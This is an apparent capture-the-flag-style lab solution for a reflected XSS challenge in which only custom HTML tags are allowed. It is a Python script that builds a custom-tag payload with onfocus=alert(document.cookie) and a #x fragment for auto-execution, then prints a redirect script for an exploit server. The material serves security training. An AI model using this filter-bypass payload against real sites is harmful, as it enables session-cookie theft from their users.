# Reflected XSS into HTML context with all tags blocked except custom ones

> This lab blocks all HTML tags except custom ones.
> To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

```python
"""
LAB: Reflected XSS into HTML context with all standard tags blocked
TYPE: Reflected XSS (Custom Tag Bypass)
DESCRIPTION: 
    1. Generates a custom tag payload to bypass the WAF.
    2. Uses 'tabindex' and 'onfocus' to create an auto-executable vector.
    3. Appends the URL hash (#) to trigger the focus event.
"""

import urllib.parse

# --- Configuration ---
BASE_URL = "https://0a78004504bad31481748fbd003100be.web-security-academy.net/"

def generate_custom_tag_exploit(base_url):
    print(f"[*] Generating Exploit for: {base_url}")
    
    # 1. Construct the Search Payload
    # We use a custom tag <xss> which usually bypasses WAF denylists.
    # tabindex=1: Makes the element focusable
    # id=x: Allows us to target it with the URL fragment
    payload_raw = "<xss id=x tabindex=1 onfocus=alert(document.cookie)>"
    
    # 2. URL Encode the search parameter
    payload_encoded = urllib.parse.quote(payload_raw)
    
    # 3. Construct the Full URL with the Hash Fragment
    # The '#x' is CRITICAL. It tells the browser to "Focus on element ID 'x'"
    exploit_url = f"{base_url}?search={payload_encoded}#x"
    
    # 4. Generate the Exploit Server Script
    # We use location=... to redirect the victim to our weaponized URL
    js_exploit = f"<script>location = '{exploit_url}';</script>"
    
    print("\n" + "-" * 50)
    print("[*] PASTE THIS INTO EXPLOIT SERVER BODY:")
    print("-" * 50)
    print(js_exploit)
    print("-" * 50)

if __name__ == "__main__":
    generate_custom_tag_exploit(BASE_URL)
```